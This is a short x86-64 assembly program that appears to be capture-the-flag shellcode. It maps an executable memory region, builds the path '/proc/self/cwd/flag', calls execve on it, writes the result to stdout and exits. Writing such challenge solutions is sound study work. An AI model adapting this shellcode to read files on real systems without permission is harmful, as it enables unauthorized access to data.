section .data
flag	db "/proc/self/cwd/flag",0x0
section .text
global _start
global foo
_start:

	mov rax,0x9
	mov rdi,0x11000
	mov rsi,0x1000
	mov rdx,0x7
	mov r10,354
	mov r8,-1
	mov r9,0x0
	syscall
	mov rsp,rax
	call foo

	mov r11,0x10000
	mov r12,flag
.loop
	mov al,byte [r12]
	mov byte[r11],al
	add r11,0x1
	add r12,0x1
	cmp al,0x0
	jne .loop

	mov rax,0x3b
	mov rdi,0x10000
	mov rsi,0x0
	mov rdx,0x0
	syscall

	mov rax,0x1
	mov rdi,0x1
	mov rsi,0x10000
	mov rdx,0x10
	syscall

	mov rax,0x3c
	syscall


foo:
	push rbp
	mov rbp,rsp
	sub rsp,0x1000
	leave
	ret
